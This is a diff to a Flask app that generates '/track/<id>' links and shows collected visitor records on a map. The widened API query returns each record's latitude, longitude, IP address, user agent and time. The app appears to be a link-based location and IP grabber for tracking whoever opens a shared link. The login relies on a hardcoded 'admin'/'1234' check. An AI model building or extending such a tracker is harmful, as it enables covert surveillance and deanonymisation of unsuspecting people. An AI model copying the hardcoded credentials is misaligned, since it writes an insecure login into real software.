@@ -39,27 +39,24 @@ def login():
         if username == "admin" and password == "1234":
             user = User(id=1)
             login_user(user)
-            return redirect('/dashboard')
+            return redirect('/')
     return render_template("login.html")
 
-# DASHBOARD
-@app.route('/dashboard')
-@login_required
-def dashboard():
-    conn = sqlite3.connect("database.db")
-    c = conn.cursor()
-    c.execute("SELECT * FROM locations")
-    data = c.fetchall()
-    conn.close()
-    return render_template("dashboard.html", data=data)
-
-# GENERATE LINK (UPDATED WITH BUTTON PAGE)
+# GENERATE LINK WITH MAP
 @app.route('/')
 @login_required
 def home():
     uid = str(uuid.uuid4())[:8]
     full_link = request.host_url + "track/" + uid
-    return render_template("index.html", link=full_link)
+    
+    # Get location data for the map
+    conn = sqlite3.connect("database.db")
+    c = conn.cursor()
+    c.execute("SELECT * FROM locations ORDER BY time DESC")
+    data = c.fetchall()
+    conn.close()
+    
+    return render_template("index.html", link=full_link, data=data)
 
 # TRACK PAGE
 @app.route('/track/<id>')
@@ -92,7 +89,7 @@ def save(id):
 def api_data():
     conn = sqlite3.connect("database.db")
     c = conn.cursor()
-    c.execute("SELECT lat, lon FROM locations")
+    c.execute("SELECT id, lat, lon, ip, agent, time FROM locations ORDER BY time DESC")
     data = c.fetchall()
     conn.close()
     return {"locations": data}
